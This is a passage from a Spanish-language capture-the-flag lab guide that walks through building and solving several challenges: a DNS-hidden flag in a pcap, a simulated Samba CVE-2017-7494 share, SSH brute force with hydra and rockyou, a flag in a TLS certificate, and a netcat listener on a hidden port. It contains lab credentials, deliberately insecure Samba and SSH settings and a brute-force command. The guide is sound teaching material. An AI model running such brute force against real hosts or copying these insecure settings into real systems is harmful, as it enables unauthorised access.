</tr>
</tbody>
</table>
<p><span id="_Toc207189896" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 4 atrapada:
'e4d909c290d0fb1ca068ffaddf22cbd0'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-5-dns-malicioso-en-trÃ¡fico-.pcap"><strong>ğŸ Bandera 5 â€“
DNS Malicioso en TrÃ¡fico .pcap</strong></h1>
<p><strong>CategorÃ­a:</strong> Red / Forense / OSINT<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Yo_soy_el_peligro<br />
<strong>Usuario involucrado:</strong> lydia<br />
<strong>ContraseÃ±a:</strong> <strong>XXXXXXXX</strong><br />
<strong>Archivo clave:</strong> DeNadieSospeches.pcap<br />
ğŸ“ Ruta esperada: /home/lydia/DeNadieSospeches.pcap</p>
<p><span id="_Toc207189898" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe analizar un archivo .pcap que contiene consultas DNS,
una de las cuales estÃ¡ manipulada para esconder la bandera en el nombre
de dominio solicitado. Solo realizando un anÃ¡lisis profundo podrÃ¡
encontrar la bandera camuflada.</p>
<p><span id="_Toc207189899" class="anchor"></span><strong>ğŸ”§ Entorno
tÃ©cnico simulado</strong></p>
<p>Esta captura se ha generado usando <strong>Scapy</strong>, con ruido
DNS incluido para dificultar la localizaciÃ³n:</p>
<p>bandera = "Bandera5:Yo_soy_el_peligro"</p>
<p>dominio = f"{bandera}.lospolloshermanos.local"</p>
<p>Esto queda embebido como una solicitud DNS en un paquete legÃ­timo,
junto a muchas consultas comunes como google.com, ftp.internal,
breakingbad.tv, etc.</p>
<p><span id="_Toc207189900" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ ConexiÃ³n SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<blockquote>
<p>ssh chow@192.168.1.44</p>
</blockquote>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<blockquote>
<p>Ch0w$up1</p>
</blockquote>
<p><img src="cookbook/media/image121.png"
style="width:5.90556in;height:3.01528in" /></p>
<p>Nos desplazamos al directorio de lydia y verificamos la presencia de
dos archivos. En este reto nos vamos a centrar en el archivo pcap:</p>
<p>ls -l</p>
<p><img src="cookbook/media/image122.png"
style="width:3.625in;height:0.76042in" /></p>
<p>DeNadieSospeches.pcap nos hace sospechar que lo que debemos buscar
dentro es DNS</p>
<p><strong>2ï¸âƒ£ Abrir el archivo con Wireshark</strong></p>
<p>Lo que vamos a hacer es enviarnos ese archivo pcap a nuestra mÃ¡quina
de Kali para analizarlo:</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/lydia/DeNadieSospeches.pcap">chow@192.168.1.44:/home/lydia/DeNadieSospeches.pcap</a>
.</p>
<p><img src="cookbook/media/image123.png"
style="width:5.90556in;height:1.0375in" /></p>
<p>Usar Wireshark para explorar las consultas DNS:</p>
<p>dns.qry.name contains "Bandera"</p>
<p>O simplemente:</p>
<p>Dns</p>
<p><img src="cookbook/media/image124.png"
style="width:5.90556in;height:1.24028in" /></p>
<p>Haz clic derecho sobre el paquete que incluya la consulta sospechosa
y selecciona:</p>
<p>Follow â†’ UDP Stream</p>
<p><strong>3ï¸âƒ£ Confirmar la bandera oculta</strong></p>
<p>Dentro de los datos del paquete se visualizarÃ¡:</p>
<p>Bandera5:Yo_soy_el_peligro.lospolloshermanos.local</p>
<p>âœ… El jugador debe extraer la parte entre Bandera5: y el
.lospollos..., que es: Yo_soy_el_peligro</p>
<p><img src="cookbook/media/image125.png"
style="width:4.95135in;height:2.67708in" /></p>
<p><strong>4ï¸âƒ£ Alternativas desde terminal (CLI)</strong></p>
<p>Si Wireshark no estÃ¡ disponible, puedes usar tshark:</p>
<p>tshark -r DeNadieSospeches.pcap -Y 'dns.qry.name contains "Bandera"'
-T fields -e dns.qry.name</p>
<p><img src="cookbook/media/image126.png"
style="width:5.90556in;height:0.71042in" /></p>
<p>Esto devolverÃ¡ directamente el dominio que contiene la bandera.</p>
<p><span id="_Toc207189901" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Se explota el hecho de que los dominios pueden contener texto
arbitrario.</p></li>
<li><p>Introduce al jugador a tÃ©cnicas de <strong>camuflaje semÃ¡ntico en
protocolos abiertos</strong>.</p></li>
<li><p>Resalta cÃ³mo se puede usar trÃ¡fico DNS legÃ­timo para transferir
informaciÃ³n encubierta sin levantar alertas evidentes.</p></li>
</ul>
<p><span id="_Toc207189902" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 5 atrapada: 'Yo_soy_el_peligro'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-6-explotaciÃ³n-de-samba-cve-2017-7494"><strong>ğŸ Bandera
6 â€“ ExplotaciÃ³n de Samba (CVE-2017-7494)</strong></h1>
<p><strong>CategorÃ­a:</strong> Pwn / Red / ExplotaciÃ³n Activa<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> Usted_es_un_maldito_artista<br />
<strong>Usuario involucrado:</strong> tyrus<br />
ğŸ“ Carpeta compartida: /home/tyrus/<br />
ğŸ”§ Recurso Samba: [anonymous]</p>
<p><span id="_Toc207189904" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe conectarse al recurso compartido
<strong>Samba</strong> expuesto por el sistema y simular la explotaciÃ³n
de la <strong>vulnerabilidad RCE (Remote Code Execution)</strong>
conocida como <strong>CVE-2017-7494</strong>, que afecta a versiones de
Samba anteriores a 4.6.4.</p>
<p><span id="_Toc207189905" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>Ya estÃ¡ configurado el servidor Samba vulnerable sobre <strong>Ubuntu
Server 14.04.6</strong>:</p>
<ol type="1">
<li><p><strong>VersiÃ³n vulnerable de Samba instalada:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install samba</p>
<p>samba -V</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>ConfiguraciÃ³n del recurso compartido</strong> en
/etc/samba/smb.conf:</p></li>
</ol>
<blockquote>
<p>[anonymous]</p>
<p>path = /home/tyrus</p>
<p>browsable = yes</p>
<p>writable = yes</p>
<p>guest ok = yes</p>
<p>guest only = yes</p>
<p>read only = no</p>
<p>force user = tyrus</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Usuario y carpeta creada:</strong></p></li>
</ol>
<blockquote>
<p>sudo useradd -m tyrus</p>
<p>sudo chown tyrus:tyrus /home/tyrus</p>
</blockquote>
<p><strong>Dar de alta el usuario en Samba</strong> (aunque no requiera
login real):</p>
<p>sudo smbpasswd -a tyrus</p>
<p>Puedes dejar el password en blanco.</p>
<p>sudo chmod 775 /home/tyrus</p>
<p>âš ï¸ No le hemos asignado contraseÃ±a al usuario tyrus en ninguno de los
pasos.</p>
<p>Eso significa que:</p>
<p>ğŸ”“ El usuario existe en el sistema, pero no puede iniciar sesiÃ³n
directamente (por ejemplo, vÃ­a ssh o consola) porque no tiene clave
definida.</p>
<p>ğŸ› ï¸ Samba lo usarÃ¡ igualmente gracias a force user = tyrus, ya que ese
parÃ¡metro obliga a tratar todo acceso al recurso compartido como si
fuera el usuario tyrus, sin requerir autenticaciÃ³n.</p>
<ol start="4" type="1">
<li><p><strong>Servicio reiniciado</strong>:</p></li>
</ol>
<blockquote>
<p>sudo service smbd restart</p>
</blockquote>
<ol start="5" type="1">
<li><p><strong>Bandera colocada en</strong>
/var/lib/samba-flags/bandera6.txt:</p></li>
</ol>
<blockquote>
<p>echo "Bandera 6:â€™Usted_es_un_maldito_artistaâ€™" | sudo tee
/var/lib/samba-flags/bandera6.txt &gt; /dev/null</p>
</blockquote>
<ol start="6" type="1">
<li><p><strong>Script desplegado:</strong></p></li>
</ol>
<p>Creamos un script en /usr/local/bin/samba_watch.sh:</p>
<p><strong>samba_watch.sh</strong></p>
<p>#!/bin/bash</p>
<p>WATCH_DIR="/home/tyrus"</p>
<p>FLAG_SRC="/var/lib/samba-flags/bandera6.txt"</p>
<p>FLAG_DST="$WATCH_DIR/bandera6.txt"</p>
<p>if [ ! -f "$FLAG_SRC" ]; then</p>
<p>echo "[ERROR] No se encuentra la bandera en $FLAG_SRC"</p>
<p>exit 1</p>
<p>fi</p>
<p>echo "[+] Watcher iniciado: vigilando $WATCH_DIR ..."</p>
<p>while true; do</p>
<p>for file in "$WATCH_DIR"/*; do</p>
<p>if [ -f "$file" ]; then</p>
<p>echo "[DEBUG] Detectado archivo: $file"</p>
<p>if [ ! -f "$FLAG_DST" ]; then</p>
<p>echo "[+] Copiando bandera..."</p>
<p>cp "$FLAG_SRC" "$FLAG_DST"</p>
<p>chown tyrus:tyrus "$FLAG_DST"</p>
<p>chmod 644 "$FLAG_DST"</p>
<p>echo "[+] Bandera copiada en $FLAG_DST"</p>
<p>fi</p>
<p>fi</p>
<p>done</p>
<p>sleep 2</p>
<p>done</p>
<ol start="7" type="1">
<li><p><strong>Lo hacemos ejecutable:</strong></p></li>
</ol>
<blockquote>
<p>sudo chmod +x /usr/local/bin/samba_watch.sh</p>
</blockquote>
<ol start="8" type="1">
<li><p>Lo lanzamos en background desde el script de instalaciÃ³n del
reto:</p></li>
</ol>
<p>nohup /usr/local/bin/samba_watch.sh &gt;/dev/null 2&gt;&amp;1
&amp;</p>
<ol start="9" type="1">
<li><p>Esto ya queda corriendo como proceso independiente. Cuando
alguien suba un archivo al recurso Samba, la bandera aparecerÃ¡ en
/home/tyrus.</p></li>
<li><p><strong>Detalles</strong>:</p></li>
</ol>
<ul>
<li><p>nohup â†’ evita que el proceso muera cuando cierres la
sesiÃ³n.</p></li>
<li><p>&gt;/dev/null 2&gt;&amp;1 â†’ manda toda la salida estÃ¡ndar y de
error a la nada (silencio total).</p></li>
<li><p>&amp; â†’ lo deja corriendo en segundo plano.</p></li>
</ul>
<p><img src="cookbook/media/image127.png"
style="width:5.90556in;height:0.63542in" /></p>
<ul>
<li><p>El [1] significa que es el <strong>primer proceso en segundo
plano</strong> que tu shell ha lanzado en esta sesiÃ³n.</p></li>
<li><p>El 1554 es el <strong>PID (Process ID)</strong> asignado al
script samba_watch.sh.</p></li>
<li></li>
</ul>
<p>Es decir: ahora mismo el watcher estÃ¡ ejecutÃ¡ndose en background,
escuchando cambios en /home/tyrus.</p>
<p><img src="cookbook/media/image128.png"
style="width:5.90556in;height:1.09375in" /></p>
<p>âœ… Esto significa que el <strong>script estÃ¡ activo y deberÃ­a
detectar archivos nuevos</strong> en /home/tyrus.</p>
<ol start="11" type="1">
<li><p><strong>Persistencia en el scrip:</strong></p></li>
</ol>
<p>El script (/usr/local/bin/samba_watch.sh) no se arranca solo â€œpor
arte de magiaâ€ al encender el sistemaâ€¦ a menos que alguien lo haya
configurado como servicio de arranque (systemd, init.d o similar).</p>
<p>Si ahora mismo lo ejecutamos nosotros a mano, al reiniciar dejarÃ¡ de
estar en memoria y no vigilarÃ¡ nada hasta que lo lancemos otra vez.</p>
<p>Si quieres que estÃ© siempre activo, puedes crear un servicio systemd
para que se levante en cada arranque.</p>
<p>En Ubuntu Server 14.04 no tienes systemctl de serie, porque esa
versiÃ³n usa Upstart como sistema init, no systemd2.</p>
<p>Esto implica que:</p>
<p>Los comandos systemctl start/stop/enable no funcionarÃ¡n a menos que
instales y configures systemd manualmente (lo cual no suele ser
recomendable en 14.04).</p>
<p>Para arrancar servicios automÃ¡ticamente en cada inicio, en 14.04 se
usan scripts en /etc/init/ (formato Upstart) o el comando update-rc.d
para servicios tipo SysV. Lo haremos de la misma forma que con el reto
de nc, modificando el archivo rc.local:</p>
<p><img src="cookbook/media/image129.png"
style="width:5.90556in;height:2.32083in" /></p>
<p>Y despuÃ©s recuerda:</p>
<p>sudo chmod +x /etc/rc.local</p>
<p>sudo chmod +x /usr/local/bin/samba_watch.sh</p>
<p><img src="cookbook/media/image130.png"
style="width:5.70833in;height:0.66667in" /></p>
<p>para que ambos sean ejecutables al arranque.</p>
<p><span id="_Toc207189906" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Descubrir el recurso compartido</strong></p>
<p>Usar herramientas como smbclient o enum4linux:</p>
<p>smbclient -L //192.168.1.44/ -N</p>
<p><img src="cookbook/media/image131.png"
style="width:5.90556in;height:2.21875in" /></p>
<p>Esto listarÃ¡ el recurso [anonymous].</p>
<p><strong>2ï¸âƒ£ Conectarse como invitado</strong></p>
<p>smbclient //192.168.1.44/anonymous -N</p>
<p><img src="cookbook/media/image132.png"
style="width:4.39583in;height:0.97917in" /></p>
<p>Esto te permitirÃ­a subir archivos al directorio /home/tyrus.</p>
<p><strong>3ï¸âƒ£ Simular la explotaciÃ³n (sin ejecuciÃ³n real)</strong></p>
<p>Dado que el entorno es simulado, no se sube un .so malicioso como en
la CVE original. Pero puedes probar el acceso y la capacidad de
escritura, demostrando que la configuraciÃ³n permitirÃ­a explotaciÃ³n si el
servicio fuera interpretado por dlopen().</p>
<p>En un entorno real, el exploit consistirÃ­a en:</p>
<ul>
<li><p>Subir un archivo .so con una funciÃ³n tipo init_module</p></li>
<li><p>Ejecutar la librerÃ­a como si fuera un mÃ³dulo</p></li>
<li><p>Obtener ejecuciÃ³n remota</p></li>
</ul>
<p>Podemos probar la funcionalidad subiendo cualquier archivo. Subimos
por ejemplo un archivo de texto llamado prueba.txt:</p>
<p>put prueba.txt</p>
<p><img src="cookbook/media/image133.png"
style="width:5.90556in;height:1.82292in" /></p>
<p>El watcher detecta la creaciÃ³n de prueba.txt y copia la bandera desde
/var/lib/samba-flags/bandera6.txt a /home/tyrus/bandera6.txt.</p>
<p><strong>4ï¸âƒ£ VerificaciÃ³n de bandera</strong></p>
<p>Una vez que el jugador ha demostrado conocimiento y habilidad para
interactuar con el recurso, puede descargar la bandera desde
sistema:</p>
<p>get bandera6.txt</p>
<p><img src="cookbook/media/image134.png"
style="width:5.90556in;height:0.61458in" /></p>
<p><img src="cookbook/media/image135.png"
style="width:5.90556in;height:4.23889in" /></p>
<p><span id="_Toc207189907" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>La bandera demuestra comprensiÃ³n de una explotaciÃ³n real de
Samba.</p></li>
<li><p>EnseÃ±a cÃ³mo una configuraciÃ³n aparentemente simple puede abrir la
puerta a RCE.</p></li>
<li><p>Refuerza prÃ¡cticas de anÃ¡lisis y enumeraciÃ³n de recursos SMB en
entornos CTF y pentest.</p></li>
</ul>
<p><span id="_Toc207189908" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 6 atrapada: 'Usted_es_un_maldito_artista'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-7-fuerza-bruta-sobre-credenciales-ssh-dÃ©biles"><strong>ğŸ
Bandera 7 â€“ Fuerza Bruta sobre Credenciales SSH DÃ©biles</strong></h1>
<p><strong>CategorÃ­a:</strong> Pwn / Red / Credenciales<br />
<strong>Nivel:</strong> BÃ¡sico - Medio<br />
<strong>Flag:</strong> Mejor_llama_a_Saul<br />
<strong>Usuario objetivo:</strong> saul<br />
<strong>ContraseÃ±a insegura:</strong> <strong>XXXXXX</strong><br />
<strong>Archivo clave:</strong> /home/saul/bandera7.txt</p>
<p><span id="_Toc207189910" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe identificar un servicio SSH activo y usar fuerza
bruta o diccionario bÃ¡sico para adivinar la contraseÃ±a dÃ©bil del usuario
saul. Tras el acceso, deberÃ¡ buscar una bandera en su directorio
personal.</p>
<p><span id="_Toc207189911" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>Una vulnerabilidad de SSH es un fallo en el protocolo, la
implementaciÃ³n o la configuraciÃ³n del servicio SSH (Secure Shell) que un
atacante puede explotar para obtener acceso no autorizado a un sistema.
A diferencia de la vulnerabilidad de Samba, que es un fallo de software
especÃ­fico, las vulnerabilidades de SSH en un CTF suelen centrarse en la
configuraciÃ³n.</p>
<p><strong>Â¿CÃ³mo funciona una vulnerabilidad de SSH?</strong></p>
<p>Las vulnerabilidades de SSH que son comunes en un entorno CTF no
suelen ser fallos de cÃ³digo complejos, sino mÃ¡s bien malas
configuraciones o malas prÃ¡cticas de seguridad. Estas son las mÃ¡s
comunes:</p>
<p>Credenciales dÃ©biles (ataque de fuerza bruta): Si el servidor SSH
permite la autenticaciÃ³n con contraseÃ±a y un usuario tiene una
contraseÃ±a muy sencilla, un atacante puede usar un diccionario o un
ataque de fuerza bruta para adivinarla. Esta es la forma mÃ¡s bÃ¡sica y
comÃºn de explotar un servidor SSH en un CTF.</p>
<p>Permitir el inicio de sesiÃ³n como root: Por defecto, la mayorÃ­a de
las configuraciones de SSH modernas no permiten que el usuario root
inicie sesiÃ³n directamente. Esto se hace por seguridad.</p>
<p>Si un servidor permite que root inicie sesiÃ³n, y un atacante adivina
la contraseÃ±a de root (o si la contraseÃ±a es dÃ©bil), obtendrÃ¡ control
total sobre la mÃ¡quina en un solo paso.</p>
<p>Claves SSH dÃ©biles o comprometidas: A veces, un reto puede implicar
que el atacante encuentre una clave privada SSH que se dejÃ³ en un lugar
inseguro (por ejemplo, en un recurso compartido de red o en un
directorio web accesible). Si el servidor SSH confÃ­a en esa clave
pÃºblica para el inicio de sesiÃ³n, el atacante puede usar la clave
privada para acceder al sistema.</p>
<p>Permisos incorrectos: Una configuraciÃ³n incorrecta en los permisos de
los archivos de configuraciÃ³n de SSH (~/.ssh/authorized_keys o
/etc/ssh/sshd_config) puede permitir que un usuario de bajo privilegio
los modifique para permitir el inicio de sesiÃ³n de un atacante.</p>
<p><strong>La mÃ¡quina estÃ¡ preparada de la siguiente
manera:</strong></p>
<ol type="1">
<li><p><strong>Se ha instalado el servidor SSH:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install openssh-server</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>El usuario vulnerable saul fue creado:</strong></p></li>
</ol>
<blockquote>
<p>sudo useradd -m -s /bin/bash saul</p>
<p>echo "saul:<strong>XXXXXX</strong>" | sudo chpasswd</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>El archivo de configuraciÃ³n del servicio permite
autenticaciÃ³n por contraseÃ±a:</strong></p></li>
</ol>
<blockquote>
<p>PasswordAuthentication yes</p>
<p>PermitRootLogin no</p>
</blockquote>
<ol start="4" type="1">
<li><p><strong>Bandera colocada en su directorio:</strong></p></li>
</ol>
<blockquote>
<p>echo "Bandera7:â€™Mejor_llama_a_Saulâ€™" &gt; /home/saul/bandera7.txt</p>
<p>sudo chown saul:saul /home/saul/bandera7.txt</p>
</blockquote>
<ol start="5" type="1">
<li><p><strong>Servicio reiniciado:</strong></p></li>
</ol>
<blockquote>
<p>sudo service ssh restart</p>
</blockquote>
<p><strong>Pista preparada</strong></p>
<blockquote>
<p>Dentro del usuario chow hay un archivo de texto oculto:</p>
</blockquote>
<p><img src="cookbook/media/image136.png"
style="width:5.83333in;height:4.08333in" /></p>
<p><span id="_Toc207189912" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Encontrar la pista</strong></p>
<p>En alguna de las ocasione que hemos realizado una conexiÃ³n SSH usando
la contraseÃ±a de chow:</p>
<p><em>Ejecuta el cliente SSH:</em></p>
<p><em>ssh chow@192.168.1.44</em></p>
<p><em>Cuando te pida la contraseÃ±a, introduce</em></p>
<p><em>Ch0w$up1</em></p>
<p>DeberÃ­amos de haber listado el directorio para que muestre tambiÃ©n
los archivos ocultos:</p>
<p>ls -la</p>
<p><img src="cookbook/media/image137.png"
style="width:5.90556in;height:2.37986in" /></p>
<p>AhÃ­ habrÃ­amos visto un fichero que se llama:
<em>.fring_to_chow_request.</em>txt</p>
<p>y que contiene el siguiente texto:</p>
<p><em>From: fring@company.com</em></p>
<p><em>To: chow@company.com</em></p>
<p><em>Subject: Solicitud sobre contraseÃ±as de Saul</em></p>
<p><em>Date: Fri, 22 Aug 2025 10:34:00 +0000</em></p>
<p><em>Hola Chow,</em></p>
<p><em>Por favor, dile a Saul que deje de usar contraseÃ±as
dÃ©biles.</em></p>
<p><em>Esto se ha convertido en un riesgo de seguridad para
todos.</em></p>
<p><em>Gracias,</em></p>
<p><em>Fring</em></p>
<p><img src="cookbook/media/image138.png"
style="width:4.01792in;height:3.14762in" /></p>
<p>Esto nos debe hacer pensar que la contraseÃ±a de saul es lo
suficientemente dÃ©bil como para probar a descifrarla por fuerza
bruta.</p>
<p><strong>2ï¸âƒ£ Fuerza bruta o intento directo</strong></p>
<p>Como la contraseÃ±a parece ser extremadamente dÃ©bil, probaremos un
ataque de fuerza bruta contra el usuario saul, usando hydra y el
diccionario rockyou.txt:</p>
<p>hydra -L /home/kali/usuario.txt -P /home/kali/rockyou.txt
ssh://192.168.1.44</p>
<p><img src="cookbook/media/image139.png"
style="width:5.90556in;height:2.71875in" /></p>
<p>Premio, hydra ha encontrado en rockyou la contraseÃ±a que realmente
era dÃ©bil de saul: 123456</p>
<p>Intentamos conectarnos con ese usuario:</p>
<p>ssh saul@192.168.1.44</p>
<p>ContraseÃ±a:</p>
<p>123456</p>
<p><img src="cookbook/media/image140.png"
style="width:5.90556in;height:3.57847in" /></p>
<p>âœ… ConexiÃ³n exitosa.</p>
<p><strong>3ï¸âƒ£ Buscar la bandera</strong></p>
<p>Una vez dentro:</p>
<p>ls -l</p>
<p><img src="cookbook/media/image141.png"
style="width:4.6875in;height:0.88542in" /></p>
<p>Tenemos un archivo bandera7.txt y un directorio llamado evidencias
que es parte de otro reto. Mostramos el contenido de la bandera:</p>
<p>cat bandera7.txt</p>
<p><img src="cookbook/media/image142.png"
style="width:3.3125in;height:0.65625in" /></p>
<p>Salida esperada:</p>
<p>Bandera7:â€™Mejor_llama_a_Saulâ€™</p>
<p><span id="_Toc207189913" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>permitir accesos crÃ­ticos.</p></li>
<li><p>Refuerza la importancia de deshabilitar autenticaciÃ³n por
contraseÃ±a o usar claves fuertes.</p></li>
<li><p>Simula un escenario realista para pruebas de pentesting y
auditado.</p></li>
<li><p>El reto muestra cÃ³mo una configuraciÃ³n insegura de SSH
puede</p></li>
</ul>
<p><span id="_Toc207189914" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 7 atrapada: 'Mejor_llama_a_Saul'</mark><strong><br />
</strong></p>
<h1
id="bandera-8-certificado-tls-con-bandera-oculta-en-commonname"><strong>ğŸ
Bandera 8 â€“ Certificado TLS con Bandera Oculta en
CommonName</strong></h1>
<p><strong>CategorÃ­a:</strong> Red / Forense / CriptografÃ­a<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> El_miedo_es_el_verdadero_enemigo<br />
<strong>Usuario involucrado:</strong> victor<br />
<strong>ContraseÃ±a:</strong> <strong>XXXXXXXX</strong><br />
<strong>Archivo clave:</strong> TodoLoSabe.pcap<br />
ğŸ“ Ruta esperada: /home/victor/TodoLoSabe.pcap</p>
<p><span id="_Toc207189916" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe analizar trÃ¡fico TLS simulado en un archivo .pcap.
Entre sesiones con certificados falsos y ruido digital, hay uno que
contiene la bandera como parte de su <strong>CommonName</strong> (CN) y
<strong>SubjectAltName</strong> en un certificado TLS embebido.</p>
<p><span id="_Toc207189917" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>Se ha generado este .pcap con un script en Python que:</p>
<ul>
<li><p>Simula mÃºltiples sesiones TCP hacia el puerto 443</p></li>
<li><p>Inserta un certificado TLS falso en formato DER</p></li>
<li><p>En uno de esos certificados, el CommonName contiene:</p></li>
<li><p>Bandera8:{El_miedo_es_el_verdadero_enemigo}</p></li>
</ul>
<p><span id="_Toc207189918" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ ConexiÃ³n SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<blockquote>
<p>ssh <a href="mailto:chow@192.168.1.44">chow@192.168.1.44</a></p>
</blockquote>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<blockquote>
<p>Ch0w$up1</p>
</blockquote>
<p><img src="cookbook/media/image143.png"
style="width:5.90556in;height:3.27361in" /></p>
<p>Nos desplazamos al directorio de victor y verificamos la presencia de
un archivo pcap.</p>
<p>ls -l</p>
<p><img src="cookbook/media/image144.png"
style="width:5.83333in;height:0.96875in" /></p>
<p>TodoLoSabe.pcap nos hace sospechar que lo que debemos buscar dentro
es TLS</p>
<p><strong>2ï¸âƒ£ Abrir el archivo con Wireshark</strong></p>
<p>Lo que vamos a hacer es enviarnos ese archivo pcap a nuestra mÃ¡quina
de Kali para analizarlo:</p>
<p>scp chow@192.168.1.44:/home/victor/TodoLoSabe.pcap .</p>
<p><img src="cookbook/media/image145.png"
style="width:5.90556in;height:1.00972in" /></p>
<p>File â†’ Open â†’ TodoLoSabe.pcap</p>
<p>Filtra sesiones TLS simuladas:</p>
<p>tcp.port == 443</p>
<p><strong>3ï¸âƒ£ Buscar la bandera en los certificados</strong></p>
<p>MÃ©todo rÃ¡pido:</p>
<p>tcp contains "Bandera8"</p>
<p>Luego haz clic derecho sobre el paquete â†’ Follow TCP Stream</p>
<p>Dentro del payload raw se verÃ¡:</p>
<p>Bandera8:{El_miedo_es_el_verdadero_enemigo}</p>
<p><img src="cookbook/media/image146.png"
style="width:5.90556in;height:3.14167in" /></p>
<p>âœ… El jugador debe extraer solo lo que estÃ¡ entre las llaves como la
bandera final.</p>
<p><strong>4ï¸âƒ£ Alternativa desde terminal</strong></p>
<p>Buscar directamente el CN en el contenido binario.</p>
<p>Ya que el certificado estÃ¡ en formato DER, puedes buscar directamente
la cadena "Bandera" en el archivo:</p>
<p>strings TodoLoSabe.pcap | grep Bandera</p>
<p><img src="cookbook/media/image147.png"
style="width:4.40625in;height:0.88542in" /></p>
<p>Esto ignora el protocolo y busca cualquier texto legible en el
archivo.</p>
<p><span id="_Toc207189919" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Se analiza trÃ¡fico cifrado donde el certificado incluye datos
falsos pero interpretables.</p></li>
<li><p>Introduce al jugador en tÃ©cnicas de esteganografÃ­a en campos de
autenticaciÃ³n TLS.</p></li>
<li><p>Requiere conocimiento de estructuras DER, PKI y uso avanzado de
Wireshark o tshark.</p></li>
</ul>
<p><span id="_Toc207189920" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 8 atrapada:
'El_miedo_es_el_verdadero_enemigo'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-9-servicio-netcat-escuchando-en-puerto-oculto"><strong>ğŸ
Bandera 9 â€“ Servicio Netcat Escuchando en Puerto Oculto</strong></h1>
<p><strong>CategorÃ­a:</strong> Red / Reconocimiento / ExplotaciÃ³n
bÃ¡sica<br />
<strong>Nivel:</strong> Medio<br />
<strong>Flag:</strong> Estoy_en_el_negocio_del_imperio<br />
<strong>Servicio escondido:</strong> Netcat en puerto 31337<br />
<strong>Archivo clave:</strong> /opt/bandera9.txt<br />
ğŸ“ƒ Contenido del archivo:</p>
<p>Bandera9: â€™Estoy_en_el_negocio_del_imperioâ€™</p>
<p><span id="_Toc207189922" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe realizar una <strong>enumeraciÃ³n de puertos
completa</strong> para descubrir que un servicio estÃ¡ escuchando en el
puerto 31337. Al conectarse, el servicio transmitirÃ¡ el contenido del
archivo de la bandera a travÃ©s de Netcat.</p>
<p><span id="_Toc207189923" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico configurado</strong></p>
<p>Un <em><strong>"puerto oculto"</strong></em> es una tÃ©cnica comÃºn en
los retos CTF para esconder un servicio vulnerable en un puerto poco
convencional, lo que obliga al atacante a realizar una enumeraciÃ³n
exhaustiva. En lugar de usar servicios estÃ¡ndar como HTTP en el puerto
80 o SSH en el 22, se configura el servicio en un puerto alto y
aleatorio (por ejemplo, 1337, 4444, 8888, 31337, etc.).</p>
<p><strong>Â¿CÃ³mo funciona la tÃ©cnica del puerto oculto?</strong></p>
<p>La idea principal es que las herramientas de escaneo de puertos por
defecto, como Nmap, suelen escanear un subconjunto de los puertos mÃ¡s
comunes (los 1000 puertos mÃ¡s conocidos). Si un servicio vulnerable no
estÃ¡ en uno de esos puertos, un escaneo superficial lo pasarÃ¡ por
alto.</p>
<p>El jugador debe realizar un escaneo completo de todos los puertos (-p
1-65535) para encontrar el servicio oculto. Una vez que lo encuentra, el
reto se vuelve similar a cualquier otro, pero el paso de enumeraciÃ³n
inicial es crucial y deliberadamente mÃ¡s difÃ­cil.</p>
<p>Para crear este tipo de reto, puedes usar herramientas ligeras como
Netcat</p>
<ol type="1">
<li><p><strong>Se ha creado el archivo de bandera:</strong></p></li>
</ol>
<blockquote>
<p>echo "Bandera9: â€™Estoy_en_el_negocio_del_imperioâ€™" &gt;
/opt/bandera9.txt</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Se ha iniciado Netcat en modo escucha:</strong></p></li>
</ol>
<blockquote>
<p>nc -lvp 31337 &lt; /opt/bandera9.txt</p>
</blockquote>
<ul>
<li><p>nc: El comando Netcat.</p></li>
<li><p>-l: Pone a Netcat en modo "oyente" (listener).</p></li>
